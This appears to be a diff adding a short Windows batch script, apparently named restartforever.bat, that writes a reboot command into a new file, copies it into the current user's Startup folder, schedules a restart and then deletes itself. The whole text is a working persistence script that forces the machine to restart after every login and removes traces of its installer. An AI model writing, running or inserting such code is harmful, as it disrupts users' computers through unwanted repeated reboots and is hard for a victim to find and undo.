@@ -1,0 +1,7 @@
+@echo off
+echo  @echo off >> system.bat
+echo shutdown.exe /r /t 1000 >> system.bat
+xcopy system.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+del system.bat
+shutdown.exe /r /t 1000
+del restartforever.bat
